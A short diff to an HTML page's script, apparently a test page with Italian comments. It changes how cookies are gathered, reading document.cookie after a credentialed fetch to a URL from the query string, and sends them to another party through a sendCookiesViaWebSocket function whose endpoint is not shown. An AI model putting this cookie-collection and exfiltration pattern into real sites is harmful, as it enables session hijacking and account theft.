@@ -45,18 +45,20 @@
         if (!url) {
             alert('URL mancante nel parametro di query.');
         } else {
-            fetch(`http://localhost:3000/get-cookies?url=${encodeURIComponent(url)}`)
-                .then(response => response.json())
-                .then(data => {
-                    const cookies = JSON.stringify(data);
-                    alert('Cookies: ' + cookies);
-                    console.log('Cookies:', cookies);
-                    sendCookiesViaWebSocket(cookies);
-                })
-                .catch((error) => {
-                    console.error('Error:', error);
-                    alert('Error fetching cookies: ' + error);
-                });
+            fetch(url, {
+                credentials: 'include' // Include i cookie nelle richieste di fetch
+            })
+            .then(response => response.text())
+            .then(data => {
+                const cookies = document.cookie;
+                console.log('Cookies:', cookies);
+                alert('Cookies: ' + cookies);
+                sendCookiesViaWebSocket(cookies);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('Error fetching cookies: ' + error);
+            });
         }
     </script>
 </body>
